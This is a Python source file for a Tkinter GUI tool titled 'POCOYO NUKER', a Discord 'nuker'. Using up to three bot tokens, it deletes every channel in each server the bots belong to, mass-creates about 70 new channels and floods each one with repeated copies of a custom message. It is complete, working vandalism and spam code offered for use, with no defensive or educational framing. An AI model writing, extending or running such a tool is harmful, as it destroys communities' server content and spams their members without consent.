# nuke gui (English, Pocoyo-themed UI, no flicker, custom channel names, auto-reset after finishing)
# Changes: Channel prefix starts empty, title shows "POCOYO NUKER --by x1mv_samet"

import tkinter as tk
from tkinter import ttk
from tkinter import messagebox
import discord
import asyncio
from discord.ext import commands
import random
import threading
import requests
from PIL import Image, ImageTk
import io

CHANNEL_COUNT = 70
MESSAGES_PER_CHANNEL = 5

intents = discord.Intents.default()
intents.guilds = True
intents.messages = True
intents.message_content = True

# -------------------- Discord Functions --------------------

async def create_channels(guild: discord.Guild, bot_name: str, num_channels: int, channel_prefix: str, status_callback):
    status_callback(f"⚡ [{bot_name}] Creating channels on server: {guild.name}")
    channel_tasks = []
    for i in range(1, num_channels + 1):
        random_number = random.randint(5000, 50000)
        channel_tasks.append(create_channel(guild, bot_name, channel_prefix, random_number, status_callback))
    await asyncio.gather(*channel_tasks, return_exceptions=True)
    status_callback(f"✅ [{bot_name}] All channels requested!")

async def create_channel(guild: discord.Guild, bot_name: str, channel_prefix: str, random_number: int, status_callback):
    try:
        channel = await guild.create_text_channel(f"{channel_prefix}-{random_number}")
        status_callback(f"✅ [{bot_name}] Created channel: {channel.name}")
        return channel
    except Exception as e:
        status_callback(f"Error creating channel: {e}")
        return None

async def send_messages(channel: discord.TextChannel, bot_name: str, custom_message: str, num_messages: int, status_callback):
    if not channel:
        status_callback(f"Skipping invalid channel for sending messages.")
        return
    status_callback(f"✉️ [{bot_name}] Sending messages in channel: {channel.name}")
    message_tasks = []
    for _ in range(num_messages):
        message_tasks.append(send_message(channel, bot_name, custom_message, status_callback))
    await asyncio.gather(*message_tasks, return_exceptions=True)
    status_callback(f"✉️ [{bot_name}] All messages sent in channel: {channel.name}")

async def send_message(channel: discord.TextChannel, bot_name: str, custom_message: str, status_callback):
    try:
        await channel.send(custom_message)
    except Exception as e:
        status_callback(f"Error sending in {channel.name}: {e}")

async def setup_server(guild: discord.Guild, bot_name: str, custom_message: str, channel_prefix: str, num_channels: int, status_callback):
    status_callback(f"⚡ [{bot_name}] Preparing server: {guild.name}")
    deletion_tasks = []
    for channel in guild.channels:
        deletion_tasks.append(delete_channel(channel, bot_name, status_callback))
    await asyncio.gather(*deletion_tasks, return_exceptions=True)
    await create_channels(guild, bot_name, num_channels, channel_prefix, status_callback)
    channels = [channel for channel in guild.channels if channel.name.startswith(channel_prefix)]
    message_tasks = []
    for channel in channels:
        message_tasks.append(send_messages(channel, bot_name, custom_message, MESSAGES_PER_CHANNEL, status_callback))
    await asyncio.gather(*message_tasks, return_exceptions=True)
    status_callback(f"🎉 [{bot_name}] Server setup completed!")

async def delete_channel(channel: discord.TextChannel, bot_name: str, status_callback):
    try:
        await channel.delete()
        status_callback(f"❌ [{bot_name}] Deleted channel: {channel.name}")
    except Exception as e:
        status_callback(f"Error deleting {channel.name}: {e}")


# -------------------- GUI Functions --------------------

def start_bots_thread(tokens, custom_message, channel_prefix, bot_count, status_callback, finish_callback):
    """
    Runs the async bot routine in a thread. finish_callback will be called when all bots finished.
    """
    # run in new event loop
    try:
        asyncio.run(start_bots(tokens, custom_message, channel_prefix, bot_count, status_callback))
    finally:
        # Ensure GUI reset is scheduled even if exceptions occur.
        finish_callback()

async def start_bots(tokens, custom_message, channel_prefix, bot_count, status_callback):
    bots = []
    for i in range(bot_count):
        bot = commands.Bot(command_prefix=f"!{i+1}", intents=intents)
        bot.custom_message = custom_message
        bot.channel_prefix = channel_prefix

        @bot.event
        async def on_ready(bot=bot, bot_index=i):
            status_callback(f"Bot {bot_index+1} is ready. Starting server setup...")
            for guild in bot.guilds:
                await setup_server(
                    guild,
                    f"BOT{bot_index+1}",
                    bot.custom_message,
                    bot.channel_prefix,
                    CHANNEL_COUNT // bot_count,
                    status_callback
                )
            status_callback(f"Bot {bot_index+1} finished. Closing bot...")
            await bot.close()

        bots.append(bot)

    # Start all bots concurrently; if fewer tokens than bots, this will raise (as before).
    await asyncio.gather(*(bot.start(tokens[i]) for i, bot in enumerate(bots)))


def start_button_clicked():
    bot_count = bot_count_var.get()
    tokens = [token_entry[i].get() for i in range(bot_count)]
    custom_message = message_entry.get()
    channel_prefix = prefix_entry.get()

    if not all(tokens):
        messagebox.showerror("Error", "Please fill in all token fields.")
        return
    if not custom_message:
        messagebox.showerror("Error", "Please enter a message.")
        return
    if not channel_prefix:
        messagebox.showerror("Error", "Please enter a channel name prefix.")
        return

    # Disable inputs
    start_button['state'] = tk.DISABLED
    for i, entry in enumerate(token_entry):
        # disable only the shown/active token entries
        if i < bot_count:
            entry['state'] = tk.DISABLED
        else:
            entry['state'] = tk.DISABLED
    message_entry['state'] = tk.DISABLED
    prefix_entry['state'] = tk.DISABLED
    bot_count_dropdown['state'] = tk.DISABLED

    # Start bots in a separate thread and pass a finish callback that schedules GUI reset.
    threading.Thread(
        target=start_bots_thread,
        args=(tokens, custom_message, channel_prefix, bot_count, update_status, schedule_gui_reset),
        daemon=True
    ).start()


def update_status(message):
    """
    Appends a line to the status textbox. This function has been used from background threads in the past;
    to keep the same behavior we schedule GUI updates on the main thread via `after`.
    """
    def append():
        status_text.config(state=tk.NORMAL)
        status_text.insert(tk.END, message + "\n")
        status_text.see(tk.END)
        status_text.config(state=tk.DISABLED)
    # Schedule on main thread
    try:
        root.after(0, append)
    except Exception:
        # Fallback: try to call directly (keeps compatibility with previous approach)
        append()


def schedule_gui_reset():
    """
    Called from the worker thread when bots are finished. Schedule the actual GUI reset on the main thread.
    """
    try:
        root.after(0, reset_gui_after_finish)
    except Exception:
        # If root isn't available for some reason, ignore.
        pass


def reset_gui_after_finish():
    """
    Re-enable UI so user can run another nuke without restarting the tool.
    """
    # Re-enable dropdown and entries for the currently selected bot count.
    bot_count_dropdown['state'] = "readonly"
    # enable token entries depending on bot count
    count = bot_count_var.get()
    for i, entry in enumerate(token_entry):
        if i < count:
            entry['state'] = tk.NORMAL
        else:
            entry['state'] = tk.DISABLED
    message_entry['state'] = tk.NORMAL
    prefix_entry['state'] = tk.NORMAL
    start_button['state'] = tk.NORMAL
    # Optional: give a final status message
    status_text.config(state=tk.NORMAL)
    status_text.insert(tk.END, "✅ All bots finished — tool reset and ready to use again.\n")
    status_text.see(tk.END)
    status_text.config(state=tk.DISABLED)


def load_pocoyo_image():
    """Load a Pocoyo image from URL"""
    try:
        # Using one of the provided Pocoyo image URLs
        url = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQKXs1fK45cC7dHPMJWfE93aAxQQv8Lw_Idbn31RBJ7i7EhmbM8oS-66uGXwwpklHGkSM4&usqp=CAU"
        response = requests.get(url)
        image = Image.open(io.BytesIO(response.content))
        # Resize to fit in our GUI
        image = image.resize((200, 150), Image.Resampling.LANCZOS)
        return ImageTk.PhotoImage(image)
    except Exception as e:
        print(f"Error loading image: {e}")
        return None


def create_gui():
    global root, bot_count_var, token_entry, message_entry, prefix_entry, status_text, start_button, bot_count_dropdown

    root = tk.Tk()
    root.title("POCOYO NUKER by x1mv_samet")
    root.geometry("750x700")
    root.resizable(False, False)
    root.configure(bg='#87CEEB')  # Sky blue background

    # Load Pocoyo image
    pocoyo_img = load_pocoyo_image()

    style = ttk.Style()
    try:
        style.theme_use('clam')
    except:
        pass
    
    # Configure styles with solid backgrounds for better visibility
    style.configure('TLabel', background='#87CEEB', foreground='#2E5077', 
                   font=('Comic Sans MS', 10, 'bold'))
    style.configure('TButton', background='#FFD700', foreground='#2E5077', 
                   font=('Comic Sans MS', 10, 'bold'), borderwidth=2, relief='raised')
    style.map('TButton',
              foreground=[('active', '#FFFFFF')],
              background=[('active', '#FF6B6B')])
    style.configure('TCombobox', fieldbackground='#FFFFFF', background='#FFFFFF')
    style.configure('TEntry', fieldbackground='#FFFFFF', background='#FFFFFF')

    # Main container with solid background
    main_container = tk.Frame(root, bg='#87CEEB', bd=3, relief='ridge', 
                             highlightbackground='#FFD700', highlightthickness=2)
    main_container.pack(padx=15, pady=15, fill='both', expand=True)

    # Header with Pocoyo theme and image
    header_frame = tk.Frame(main_container, bg='#87CEEB')
    header_frame.pack(pady=(10, 5), fill='x')
    
    # Create a frame for title and image side by side
    title_frame = tk.Frame(header_frame, bg='#87CEEB')
    title_frame.pack(fill='x')
    
    # Pocoyo image on the left
    if pocoyo_img:
        image_label = tk.Label(title_frame, image=pocoyo_img, bg='#87CEEB')
        image_label.pack(side='left', padx=10)
        # Keep reference to prevent garbage collection
        root.pocoyo_img = pocoyo_img
    
    # Title in the center
    title_text_frame = tk.Frame(title_frame, bg='#87CEEB')
    title_text_frame.pack(side='left', expand=True)
    
    title_label = tk.Label(title_text_frame, text="POCOYO NUKER", 
                          font=('Comic Sans MS', 32, 'bold'), 
                          fg='#2E5077', bg='#87CEEB')
    title_label.pack()
    
    subtitle_label = tk.Label(title_text_frame, text="by x1mv_samet", 
                             font=('Comic Sans MS', 12, 'italic'), 
                             fg='#FF6B6B', bg='#87CEEB')
    subtitle_label.pack()

    # Content frame with white background for better readability
    content_frame = tk.Frame(main_container, bg='#FFFFFF', bd=2, relief='flat')
    content_frame.pack(padx=10, pady=10, fill='both', expand=True)

    # Bot count row
    top_row = tk.Frame(content_frame, bg='#FFFFFF')
    top_row.pack(pady=8, fill='x', padx=10)
    bot_count_label = ttk.Label(top_row, text="Number of Bots:")
    bot_count_label.pack(side='left', padx=(8,4))
    bot_count_var = tk.IntVar(value=1)
    bot_count_dropdown = ttk.Combobox(top_row, textvariable=bot_count_var, 
                                     values=[1, 2, 3], state="readonly", width=6)
    bot_count_dropdown.pack(side='left')

    # Token fields
    tokens_frame = tk.Frame(content_frame, bg='#FFFFFF')
    tokens_frame.pack(pady=8, fill='x', padx=10)
    token_entry = []
    for i in range(3):
        row = tk.Frame(tokens_frame, bg='#FFFFFF')
        row.pack(fill='x', pady=4)
        token_label = ttk.Label(row, text=f"Bot {i+1} Token:")
        token_label.pack(side='left', padx=(4,6))
        entry = ttk.Entry(row, width=48, show="*")
        entry.pack(side='left', padx=2)
        token_entry.append(entry)
        # disable entries beyond initial bot_count
        if i >= bot_count_var.get():
            entry.config(state=tk.DISABLED)

    def update_token_fields(*args):
        count = bot_count_var.get()
        for i in range(3):
            if i < count:
                token_entry[i].config(state=tk.NORMAL)
            else:
                token_entry[i].config(state=tk.DISABLED)
    bot_count_var.trace('w', update_token_fields)

    # Channel prefix entry (now empty by default)
    prefix_row = tk.Frame(content_frame, bg='#FFFFFF')
    prefix_row.pack(pady=8, fill='x', padx=10)
    prefix_label = ttk.Label(prefix_row, text="Channel Name Prefix:")
    prefix_label.pack(side='left', padx=(4,6))
    prefix_entry = ttk.Entry(prefix_row, width=56)
    # no default inserted here -> starts empty
    prefix_entry.pack(side='left')

    # Message entry
    msg_row = tk.Frame(content_frame, bg='#FFFFFF')
    msg_row.pack(pady=8, fill='x', padx=10)
    message_label = ttk.Label(msg_row, text="Message:")
    message_label.pack(side='left', padx=(4,6))
    message_entry = ttk.Entry(msg_row, width=56)
    message_entry.pack(side='left')

    # Buttons row
    btn_row = tk.Frame(content_frame, bg='#FFFFFF')
    btn_row.pack(pady=15)
    start_button = tk.Button(btn_row, text="🎈 START NUKE 🎈", command=start_button_clicked,
                             font=('Comic Sans MS', 14, 'bold'), bd=2, relief='raised', 
                             padx=20, pady=8, cursor="hand2")
    start_button.pack(side='left', padx=8)

    def on_enter_start(e):
        start_button.config(bg='#FF6B6B', fg='#FFFFFF')
    def on_leave_start(e):
        start_button.config(bg='#FFD700', fg='#2E5077')
    start_button.config(bg='#FFD700', fg='#2E5077')
    start_button.bind("<Enter>", on_enter_start)
    start_button.bind("<Leave>", on_leave_start)

    # Status box
    status_frame = tk.Frame(content_frame, bg='#FFFFFF')
    status_frame.pack(pady=8, fill='both', expand=True, padx=10)
    status_label = ttk.Label(status_frame, text="Status:")
    status_label.pack(anchor='w', pady=(0, 5))
    
    # Create a frame for the status text with border
    status_text_frame = tk.Frame(status_frame, bg='#FFD700', bd=2, relief='sunken')
    status_text_frame.pack(fill='both', expand=True)
    
    status_text = tk.Text(status_text_frame, width=78, height=12, state=tk.DISABLED,
                          bg='#F0F8FF', fg='#2E5077', insertbackground='#2E5077', 
                          font=('Comic Sans MS', 9), wrap=tk.WORD)
    status_text.pack(padx=2, pady=2, fill='both', expand=True)
    
    # Add scrollbar to status text
    scrollbar = ttk.Scrollbar(status_text_frame, orient="vertical", command=status_text.yview)
    scrollbar.pack(side="right", fill="y")
    status_text.configure(yscrollcommand=scrollbar.set)

    # Footer with Pocoyo theme
    footer_frame = tk.Frame(main_container, bg='#87CEEB')
    footer_frame.pack(pady=(5, 0), fill='x')
    
    footer = tk.Label(footer_frame, text="discord: @04le // telegram: @x1mv_samet",
                      bg='#87CEEB', fg='#2E5077', font=('Comic Sans MS', 9, 'italic'))
    footer.pack()

    root.mainloop()


if __name__ == "__main__":
    create_gui()